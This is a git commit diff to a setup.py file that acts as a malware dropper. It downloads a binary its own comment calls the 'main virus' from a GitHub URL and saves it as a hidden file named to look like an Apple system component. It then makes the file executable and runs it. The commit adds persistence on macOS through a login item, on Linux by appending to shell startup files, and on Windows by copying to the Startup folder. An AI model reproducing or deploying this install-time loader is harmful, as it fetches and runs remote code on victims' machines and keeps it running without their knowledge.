37ecd76e261d82638fd997d4d40dd3c3bd8072c3
littleblack111 <jerrylam110209@gmail.com>
2023-08-14 17:25:10 +0800

    updated

--- setup.py
+++ setup.py
@@ -3,6 +3,7 @@ from os.path import expanduser
 from os import remove
 from subprocess import Popen as subproc
 from os import system
+from sys import platform
 
 filename = "com.apple.com.user.core"
 localfile = f"{expanduser('~')}/.{filename}"
@@ -10,7 +11,18 @@ localfile = f"{expanduser('~')}/.{filename}"
 # download main virus
 open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)
 
-system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")
 system(f"chmod 555 {localfile}")
+
+if platform == "darwin":
+    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")
+elif platform == "linux":
+    from os import environ
+    if 'zsh' in environ['SHELL']:
+        system(f"echo {localfile} >> {expanduser('~')}/.zshenv")
+    elif 'bash' in environ['SHELL']:
+        system(f"echo {localfile} >> {expanduser('~')}/.bashenv")
+elif platform == "win32":
+    from shutil import copy
+    copy(localfile ,"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
 
 subproc([localfile])
